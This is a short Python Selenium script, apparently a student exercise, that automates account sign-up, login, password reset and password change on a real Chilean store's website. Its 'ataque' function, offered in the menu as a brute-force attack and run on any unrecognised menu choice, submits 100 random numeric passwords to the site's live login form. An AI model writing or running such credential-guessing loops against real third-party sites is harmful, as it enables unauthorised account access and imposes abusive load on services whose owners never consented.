from selenium.webdriver import Chrome
from selenium.webdriver.common.keys import Keys 
from selenium.webdriver import ActionChains
import random
import time 
def creacion():
	browser = Chrome()
	browser.get('https://braloy.cl/iniciar-sesion?back=my-account')
	button = browser.find_element_by_class_name('no-account')
	button.click()

	button = browser.find_element_by_name('firstname')
	button.send_keys('nombre')
	button = browser.find_element_by_name('lastname')
	button.send_keys('apellido')
	button = browser.find_element_by_name('email')
	button.send_keys('correo@gmail.com')
	button = browser.find_element_by_name('password')
	button.send_keys('contraseña')
	button = browser.find_element_by_id('ff_psgdpr')
	button.click()
	button = browser.find_element_by_class_name('form-control-submit')
	button.click()
def ingresar():
	browser = Chrome()
	browser.get('https://braloy.cl/iniciar-sesion?back=my-account')

	button = browser.find_element_by_name('email')
	button.send_keys('correo@gmail.com')
	button = browser.find_element_by_name('password')
	button.send_keys('contraseña')

	button = browser.find_element_by_class_name('form-control-submit')
	button.click()
def reestablecer(): 
	browser = Chrome()
	browser.get('https://braloy.cl/recuperar-contraseña')
	button = browser.find_element_by_id('email')
	button.send_keys('correo@gmail.com')
	button.send_keys(Keys.ENTER)
def cambiar(): 
	browser = Chrome()
	browser.get('https://braloy.cl/iniciar-sesion?back=my-account')

	button = browser.find_element_by_name('email')
	button.send_keys('correo@gmail.com')
	button = browser.find_element_by_name('password')
	button.send_keys('12345')

	button = browser.find_element_by_class_name('form-control-submit')
	button.click()
	button = browser.find_element_by_id('identity-link')
	button.click()
	button = browser.find_element_by_name('password')
	button.send_keys('12345')
	button = browser.find_element_by_name('new_password')
	button.send_keys('123456')

	button = browser.find_element_by_id('ff_psgdpr')
	button.click()
	button = browser.find_element_by_class_name('form-control-submit')
	button.click()
def ataque():
	browser = Chrome()
	browser.get('https://braloy.cl/iniciar-sesion?back=my-account')
	for x in range(100):
		button = browser.find_element_by_name('email')
		button.clear()
		button.send_keys('correo')
		button = browser.find_element_by_name('password')
		dato = random.randint(10000,100000) 
		button.send_keys(dato)
		button = browser.find_element_by_class_name('form-control-submit')
		print("intento : ",  x )
		button.click()
		time.sleep(2)

c = True
while c : 
	print('Creacion de cuenta (1)')
	print('Ingresar a cuenta  (2)')
	print('Reestablecer cuenta (3)')
	print('cambiar contraseña (4)')
	print('Ataque por fuerza bruta (5)')
	opcion = input()

	if opcion == '1':
		creacion()
	elif opcion == '2': 
		ingresar()
	elif opcion == '3': 
		reestablecer()
	elif opcion =='4': 
		cambiar()
	else : 
		ataque()